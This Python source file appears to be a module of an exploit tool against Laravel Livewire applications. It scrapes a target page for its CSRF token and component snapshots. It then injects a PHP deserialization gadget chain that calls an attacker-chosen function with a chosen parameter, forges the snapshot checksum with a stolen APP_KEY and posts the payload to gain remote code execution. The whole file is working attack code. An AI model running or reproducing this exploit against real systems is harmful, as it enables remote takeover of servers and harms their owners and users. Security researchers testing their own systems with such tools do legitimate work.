import re
import html
import hmac
import json
import hashlib

from .exploit import Exploit

class ExploitWithAppKey(Exploit):
    def __init__(self, url, debug, function, param, headers, proxy_url, app_key):
        super().__init__(url, debug, function, param, headers, proxy_url, app_key)
        self.payload = {}
    
    def checksum(self, snapshot):
        parsed_key = self.laravel_encrypter.retrieve_key(self.app_key)
        h = hmac.new( parsed_key, snapshot.encode("utf-8"), hashlib.sha256)
        return str(h.hexdigest())

    def build_payload(self, snapshot):
        first_arg = list(snapshot['data'].keys())[0]
        snapshot['data'][first_arg] = [{"a":[{"__toString":"phpversion","close":[[[{"chained":["O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":4:{s:5:\"dummy\";O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\u0000*\u0000events\";O:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\";a:1:{s:0:\"\";s:"+str(len(self.function))+":\""+self.function+"\";}}s:8:\"\u0000*\u0000event\";s:"+str(len(self.param))+":\""+self.param+"\";}s:10:\"connection\";N;s:5:\"queue\";N;s:5:\"event\";O:37:\"Illuminate\\Notifications\\Notification\":0:{}}"]},{"s":"form","class":"Illuminate\\Broadcasting\\BroadcastEvent"}],"dispatchNextJobInChain"],{"s":"clctn","class":"Laravel\\SerializableClosure\\Serializers\\Signed"}]},{"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"}],"b":[{"__toString":[[[None,{"s":"mdl","class":"Laravel\\Prompts\\Terminal"}],"exit"],{"s":"clctn","class":"Laravel\\SerializableClosure\\Serializers\\Signed"}]},{"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"}]},{"class":"League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator","s":"clctn"}]
        
        # Due to PHP weird json_encode() parsing, we must replace / by \/
        snapshot['checksum'] = self.checksum(json.dumps(snapshot).replace(" ","").replace("/","\/"))
        self.payload['components'][0]['snapshot'] = json.dumps(snapshot).replace(" ","").replace("/","\/")
    
    def exploit(self):
        self.logger.info("Running exploit with APP_KEY.")
        self.token = self.get_csrf_token(self.page_content.text)
        if self.token is None:
            self.logger.error("Impossible to locate CSRF token. Exiting.")
            return
        self.update_uri = self.get_update_uri(self.page_content.text)
        if self.update_uri is None:
            self.logger.error("Impossible to locate update URI. Exiting.")
            return
        all_snapshots = re.findall(r'wire:snapshot="([^"]*)"', self.page_content.text)
        self.logger.info(f"Found {len(all_snapshots)} snapshot(s) available.")
        for snapshot in all_snapshots:
            self.payload = {
                "_token": self.token,
                "components": [
                    {
                        "snapshot": snapshot,
                        "updates":{},
                        "calls":[]
                    }
                ]
            }
            snapshot_content = json.loads(html.unescape(snapshot))
            snapshot_content.pop("checksum")
            if not snapshot_content.get("data"):
                self.logger.error("Current snapshot does not contain any data.")
                continue
            if len(snapshot_content.get('data').keys()) == 0:
                self.logger.error("Snapshot data is empty.")
                continue
            self.build_payload(snapshot_content)
            self.logger.info(f"Sending payload {self.function}('{self.param}') to livewire.")
            url = f"{self.base_url}{self.update_uri}"
            if self.update_uri.startswith(("http://", "https://")):
                url = self.update_uri
            self.logger.debug(f"POST -> {self.url}")
            res = self.session.post(url, json=self.payload)
            if res.status_code != 200:
                self.logger.error(f"Server encounters an error, the APP_KEY might be incorrect.")
                return False
            else:
                self.logger.info(f"Payload works, output:\033[0m\n{res.text}")
                return True
    
    def run(self):
        try:
            self.logger.debug(f"GET -> {self.url}")
            self.page_content = self.session.get(self.url, timeout=5)
        except:
            self.logger.error(f"Timeout GET -> {self.url}")
            return
        if not self.check_livewire():
            self.logger.error("Target does not seems to be running Livewire. Exiting.")
            return
        else:
            self.logger.info("Target seems to be running Livewire, checking for snapshots.")
        
        if not self.check_snapshot():
            self.logger.error("No snapshots found. Exiting.")
        else:
            self.logger.info("Found snapshot(s). Running exploit.")
        
        try:
            self.logger.debug(f"Running exploit.")
            self.exploit()
        except Exception as e:
            self.logger.error(f"Request failed: {e}")
